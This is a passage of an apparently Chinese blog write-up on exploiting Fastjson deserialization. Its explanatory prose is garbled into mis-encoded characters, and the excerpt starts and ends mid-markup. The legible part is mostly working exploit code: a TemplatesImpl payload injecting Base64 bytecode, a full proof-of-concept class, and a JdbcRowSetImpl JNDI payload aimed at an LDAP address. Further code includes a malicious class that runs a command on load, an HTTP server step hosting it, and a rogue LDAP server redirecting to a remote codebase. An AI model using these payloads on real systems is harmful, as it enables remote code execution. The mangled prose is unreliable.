class="string"> \&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS + <span class="string">&quot;\&quot;,</span></span><br><span class="line"><span class="string"> \&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="string">&quot;\&quot;],</span></span><br><span class="line"><span class="string"> &#x27;_name&#x27;:&#x27;Y0n3er&#x27;,</span></span><br><span class="line"><span class="string"> &#x27;_tfactory&#x27;:&#123; &#125;,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ç»è¿‡å°è¯•è¿˜æ˜¯ä¸è¡Œçš„ï¼Œæ‰€ä»¥ç»§ç»­åˆ†æï¼Œè¿™é‡Œå†çœ‹ä¸€ä¸‹Fastjsonä¼šå¯¹setter&#x2F;getteræ–¹æ³•è¿›è¡Œè°ƒç”¨çš„è¦æ±‚<br>æ»¡è¶³æ¡ä»¶çš„setterï¼š</p><ul><li>éé™æ€å‡½æ•°</li><li>è¿”å›ç±»å‹ä¸ºvoidæˆ–å½“å‰ç±»</li><li>å‚æ•°ä¸ªæ•°ä¸º1ä¸ª</li></ul><p>æ»¡è¶³æ¡ä»¶çš„getterï¼š</p><ul><li>éé™æ€æ–¹æ³•</li><li>æ— å‚æ•°</li><li><strong>è¿”å›å€¼ç±»å‹ç»§æ‰¿è‡ªCollectionæˆ–Mapæˆ–AtomicBooleanæˆ–AtomicIntegeræˆ–AtomicLong</strong></li></ul><p>è€Œ<code>getTransletInstance()</code> è¿™ä¸ªæ–¹æ³•ä¸æ»¡è¶³ä¸Šè¿°çš„è¿”å›å€¼ï¼Œå¦‚ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212126152.png" alt="image-20230821212632069"><br>å®ƒè·å–äº†å®ç°Transletæ¥å£ç±»çš„å®ä¾‹ï¼Œæ‰€ä»¥å®ƒè¿”å›çš„æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œä¸æ»¡è¶³ä¸Šè¿°çš„è¿”å›ç±»å‹ï¼Œfastjsonæ— æ³•è°ƒç”¨åˆ°</p><h4 id="è§£å†³æ— æ³•è°ƒç”¨-getTransletInstance-æ–¹æ³•çš„é—®é¢˜"><a href="#è§£å†³æ— æ³•è°ƒç”¨-getTransletInstance-æ–¹æ³•çš„é—®é¢˜" class="headerlink" title="è§£å†³æ— æ³•è°ƒç”¨ getTransletInstance() æ–¹æ³•çš„é—®é¢˜"></a>è§£å†³æ— æ³•è°ƒç”¨ <code>getTransletInstance()</code> æ–¹æ³•çš„é—®é¢˜</h4><p>é‚£ä¹ˆåœ¨è¿™é‡Œå°±åƒä¹‹å‰æ‰¾é“¾å­ä¸€æ ·ï¼Œfind usagesæ‰¾è°è°ƒç”¨äº†<code>getTransletInstance()</code> æ–¹æ³•ï¼Œå‘ç°åœ¨åŒä¸€ä¸ªç±»ä¸‹çš„<code>newTransformer()</code>æ–¹æ³•ä¸­è°ƒç”¨äº†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212127692.png" alt="image-20230821212713593"><br>ä½†æ˜¯<code>newTransformer()</code>ä¸æ˜¯setter&#x2F;getteræ–¹æ³•ï¼Œæ— æ³•ç›´æ¥è°ƒç”¨ï¼Œæ‰€ä»¥ç»§ç»­æ‰¾è°è°ƒç”¨äº†<code>newTransformer()</code>ï¼Œç„¶åæ‰¾åˆ°äº†ä¸€ä¸ªgetteræ–¹æ³•ä¸º<code>getOutputProperties()</code>åœ¨è¿™ä¸ªæ–¹æ³•é‡Œé¢è°ƒç”¨äº†<code>newTransformer()</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212128528.png" alt="image-20230821212745315"><br>æ‰€ä»¥è¿™æ—¶çš„é“¾å­å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties()  ---&gt; newTransformer() ---&gt; TransformerImpl(getTransletInstance(), _outputProperties,  </span><br><span class="line"> _indentNumber, _tfactory);</span><br></pre></td></tr></table></figure><p>è€Œä¸”è¿™ä¸ª <code>getOutputProperties()</code> æ»¡è¶³ getter æ–¹æ³•é‡Œé¢çš„è¿”å›å€¼ï¼Œå› ä¸ºè¿”å›å€¼æ˜¯ Properties å³ç»§æ‰¿è‡ª Map ç±»å‹ã€‚<br>æ‰€ä»¥æˆ‘ä»¬ç°åœ¨çš„ payload é‡Œé¢éœ€è¦å»ç®¡ <code>getOutputProperties()</code> çš„ <code>_outputProperties</code> å˜é‡çš„å€¼ï¼Œç›´æ¥èµ‹å€¼ä¸ºç©ºï¼Œå› ä¸ºåœ¨å‰é¢çš„è°ƒç”¨ä¸­ä¼šæŠŠ <code>_outputProperties</code> å˜ä¸º <code>outputProperties</code> ï¼Œç„¶åè°ƒç”¨è¿™ä¸ªå±æ€§çš„getteræ–¹æ³•å³<code>getOutputProperties()</code>è¿™æ ·å°±è¿èµ·æ¥äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ payload å¤§æ¦‚æ˜¯è¿™æ ·çš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">NASTY_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">evilClassPath</span> <span class="operator">=</span> <span class="string">&quot;E:\\Javaååºåˆ—åŒ–\\test.class&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">evilCode</span> <span class="operator">=</span> readClass(evilClassPath);</span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> \&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS + <span class="string">&quot;\&quot;,</span></span><br><span class="line"><span class="string"> \&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="string">&quot;\&quot;],</span></span><br><span class="line"><span class="string"> &#x27;_name&#x27;:&#x27;Y0n3er&#x27;,</span></span><br><span class="line"><span class="string"> &#x27;_tfactory&#x27;:&#123; &#125;,</span></span><br><span class="line"><span class="string"> \&quot;_outputProperties\&quot;:&#123; &#125;,</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br></pre></td></tr></table></figure><p>å…¶å®è¿™æ ·å†æ„é€ expå°±èƒ½å¼¹å‡ºè®¡ç®—å™¨äº†ï¼Œä½†æ˜¯è¿™é‡Œè¿˜æ˜¯å…ˆå…·ä½“çœ‹ä¸€ä¸‹ä¸ºä»€ä¹ˆè¦åŠ ä¸Š<code>_outputProperties</code> æœ€ç»ˆæ˜¯æ‰¾åˆ°äº†ä¸‹é¢è¿™é‡Œ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212129248.png"><br>åœ¨JavaBeanDeserializerç±»ä¸‹çš„<code>parseField()</code>ä¸­è°ƒç”¨äº†<code>smartMatch()</code>æ–¹æ³•ï¼Œè·Ÿè¿›è¿™ä¸ªæ–¹æ³•çœ‹çœ‹ï¼Œé€šè¿‡è¿™ä¸ªæ–¹æ³•è·å–åˆ°keyä¸º<code>_outputProperties</code>ç„¶åç»è¿‡ä¸€ç³»åˆ—æ“ä½œå°†<code>_outputProperties</code>æ›¿æ¢ä¸º<code>outputProperties</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212131128.png" alt="image-20230821213147513"><br>é‚£ä¹ˆè·å–åˆ°è¿™ä¸ªå±æ€§ä¹‹åå°±ä¼šå»è°ƒç”¨è¿™ä¸ªå±æ€§çš„getteræ–¹æ³•ï¼Œè¿™æ ·å°±æ¥åˆ°äº†<code>getOutputProperties()</code>æ–¹æ³•ä¸­ï¼Œæ‰€ä»¥ä¸è¦è¿™ä¸ªå±æ€§æ˜¯ä¸è¡Œçš„ï¼Œç„¶åå°±æ˜¯ä¹‹å‰çš„é‚£ä¸ªé—®é¢˜ï¼Œå…³äº<code>_tfactory</code>è¿™ä¸ªå±æ€§ï¼Œåœ¨fastjsonè¿™æ¡é“¾ä¸­ï¼Œè¿™é‡Œç›´æ¥å°†å®ƒè®¾ç½®ä¸º<code>&#39;_tfactory&#39;:&#123; &#125;</code>å³æ²¡æœ‰åšä»»ä½•å¤„ç†ï¼Œè®©å®ƒè‡ªå·±åˆå§‹åŒ–ç„¶åå»è°ƒç”¨<code>getExternalExtensionsMap()</code>æ–¹æ³•ï¼Œæ‰€ä»¥è¿™é‡Œå’ŒCC3ä¸­ä¸å¤ªä¸€æ ·è¿™ä¸ªé—®é¢˜å°±åˆ°æ—¶å€™å†å»çœ‹çœ‹CC3å§</p><h3 id="2-EXP-æ„é€ "><a href="#2-EXP-æ„é€ " class="headerlink" title="2. EXP æ„é€ "></a>2. EXP æ„é€ </h3><p>è¿™é‡Œpayloadå°±æ˜¯å‰é¢çš„é‚£ä¸ªï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™çš„å‚æ•°éœ€è¦åŠ ä¸Š <code>Object.class</code> åŠ ä¸Šè¿™ä¸ªå‚æ•°åä¼šè¿”å›æˆ‘ä»¬ååºåˆ—åŒ–çš„ç±»ï¼Œä¸ç„¶å°±è¿”å›çš„æ˜¯<code>parseObject</code>å½“ç„¶åˆ©ç”¨<code>parse</code>æ¥ååºåˆ—åŒ–å°±ä¸éœ€è¦ï¼Œç„¶åè¿˜éœ€è¦åŠ ä¸Š<code>Feature.SupportNonPublicField</code>è¿™ä¸ªåœ¨å‰é¢å·²ç»æè¿‡äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonPoc;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.File;  </span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImplPoc</span> &#123;  </span><br><span class="line">    <span class="comment">//readClassç”¨äºå°†æ¶æ„ç±»çš„äºŒè¿›åˆ¶æ•°æ®è¿›è¡Œbase64ç¼–ç ï¼Œå› ä¸ºbytesValue()ä¼šå¯¹_bytecodesçš„å†…å®¹è¿›è¡ŒBase64è§£ç   </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readClass</span><span class="params">(String cls)</span>&#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            IOUtils.copy(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(cls)), bos);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> Base64.encodeBase64String(bos.toByteArray());  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();  </span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">fileSeparator</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;file.separator&quot;</span>);  </span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">evilClassPath</span> <span class="operator">=</span> <span class="string">&quot;E:\\Javaååºåˆ—åŒ–\\test.class&quot;</span>;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">evilCode</span> <span class="operator">=</span> readClass(evilClassPath);  </span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NASTY_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">text1</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +  </span><br><span class="line">                    <span class="string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;y0n3er&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span>;  </span><br><span class="line">            System.out.println(text1);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//            Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);  </span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parse(text1, Feature.SupportNonPublicField);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212132383.png" alt="image-20230821213209083"></p><h2 id="JdbcRowSetImpl-åˆ©ç”¨é“¾"><a href="#JdbcRowSetImpl-åˆ©ç”¨é“¾" class="headerlink" title="JdbcRowSetImpl åˆ©ç”¨é“¾"></a>JdbcRowSetImpl åˆ©ç”¨é“¾</h2><p>è¿™æ¡é“¾å­å°±æ˜¯å¹³æ—¶ç”¨çš„å¤šçš„ä¸€æ¡ï¼Œåˆ©ç”¨çš„æ˜¯jndiæ³¨å…¥</p><h3 id="1-JNDI-LDAP"><a href="#1-JNDI-LDAP" class="headerlink" title="1.JNDI + LDAP"></a>1.JNDI + LDAP</h3><p>ç›´æ¥åˆ†æä¸€ä¸‹æµç¨‹å§ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆå¤ç°å¤±è´¥äº†ã€‚ã€‚ã€‚<br>è¿™é‡Œç›´æ¥æ¥åˆ°<code>JdbcRowSetImpl</code>è¿™ä¸ªç±»ä¸‹ï¼Œåœ¨<code>connect()</code>æ–¹æ³•ä¸‹å¯ä»¥çœ‹åˆ°æ˜æ˜¾çš„jndiæ³¨å…¥<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212133674.png" alt="image-20230821213335448"><br>ç°åœ¨å¯»æ‰¾å“ªé‡Œè°ƒç”¨äº†<code>connect()</code>ï¼Œæœ€ç»ˆæ˜¯æ‰¾åˆ°äº†ä¸¤ä¸ªï¼Œä½†æ˜¯<code>getDatabaseMetaData()</code>è¿”å›ç±»å‹ä¸ç¬¦åˆgetterè°ƒç”¨æ¡ä»¶ï¼Œæ‰€ä»¥å°±æ‰¾åˆ°äº†<code>setAutoCommit()</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212133893.png" alt="image-20230821213346258"><br>è¿™é‡Œæˆ‘find uasgesæ˜¯èƒ½æ‰¾åˆ°è°ƒç”¨ä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆå³è¾¹ä¸æ˜¾ç¤ºå¦‚ä¸Šå›¾ï¼Œå¹¶ä¸”ä¸èƒ½ç›´æ¥è·³è½¬åˆ°æºç ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯å› ä¸ºæ˜¯classæ–‡ä»¶çš„åŸå› ï¼Œåˆ°è¿™é‡Œå°±ç®—ç»“æŸäº†ï¼Œexpå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonPoc;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImplPOC</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:8085/jhLlcFdL\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåˆ©ç”¨çš„æ˜¯yakitåè¿æœåŠ¡ä½œä¸ºserverï¼Œæ¯”è¾ƒæ–¹ä¾¿<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212137308.png" alt="image-20230821213716194"><br>èƒ½æ¥æ”¶åˆ°ldapçš„è¯·æ±‚ï¼Œä½†å°±æ˜¯å¼¹ä¸å‡ºè®¡ç®—å™¨ï¼ŒæŠ¥é”™å¦‚ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212137198.png" alt="image-20230821213725971"><br>è®¾ç½®autoCommitå±æ€§é”™è¯¯ï¼Œä¸çŸ¥é“å‘½ä»¤æ‰§è¡Œå¤±è´¥æ˜¯ä¸æ˜¯å› ä¸ºè¿™ä¸ªæŠ¥é”™ï¼Œç”±äºå¤ç°å¤±è´¥ä¹Ÿä¸æƒ³è°ƒè¯•åˆ†æäº†ï¼Œåé¢åˆçœ‹äº†çœ‹ç›´æ¥è·³åˆ°äº†ä¸‹é¢è¿™é‡ŒæŠ›å‡ºInvocationTargetExceptionå¼‚å¸¸ï¼Œä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆè§£å†³<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212137289.png" alt="image-20230821213750166"><br>å› ä¸ºæ‰“çš„æ˜¯jndiæ³¨å…¥ï¼Œæ‰€ä»¥åˆ©ç”¨æ¡ä»¶ä¸€æ ·ï¼Œä¹Ÿå¿…é¡»è¦å‡ºç½‘ã€‚<br>åé¢åˆçœ‹äº†çœ‹ï¼Œæ¢äº†ä¸ªæ–¹å¼æ¥æ‰“ï¼Œè‡ªå·±èµ·æœåŠ¡ä¸ä½¿ç”¨yakitï¼Œé¦–å…ˆç”Ÿæˆä¸€ä¸ªæ¶æ„å­—èŠ‚ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢è¿™ä¸ªåˆ©ç”¨javacç¼–è¯‘ä¸ºclassæ–‡ä»¶ï¼Œç„¶ååˆ©ç”¨pythonèµ·ä¸€ä¸ªæœåŠ¡ï¼Œè®°å¾—èµ·pythonæœåŠ¡çš„è·¯å¾„è¦å’Œclassæ–‡ä»¶è·¯å¾„ä¸€æ ·ä¸ç„¶è¯»å–ä¸åˆ°classæ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server</span><br></pre></td></tr></table></figure><p>ç„¶åèµ·æœåŠ¡ç«¯ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonPoc;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;  </span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;  </span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;  </span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;  </span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;  </span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;  </span><br><span class="line"><span class="keyword">import</span> java.net.URL;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LdapServer</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8000/#test&quot;</span>;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1099</span>;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);  </span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(  </span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>,  </span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),  </span><br><span class="line">                    port,  </span><br><span class="line">                    ServerSocketFactory.getDefault(),  </span><br><span class="line">                    SocketFactory.getDefault(),  </span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));  </span><br><span class="line">  </span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(url)));  </span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);  </span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);  </span><br><span class="line">            ds.startListening();  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;  </span><br><span class="line">        <span class="keyword">private</span> URL codebase;  </span><br><span class="line">        <span class="comment">/**  </span></span><br><span class="line"><span class="comment">         * */</span> <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;  </span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="comment">/**  </span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;  </span></span><br><span class="line"><span class="comment">         * * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)  </span></span><br><span class="line"><span class="comment">         */</span> <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();  </span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                sendResult(result, base, e);  </span><br><span class="line">            &#125;  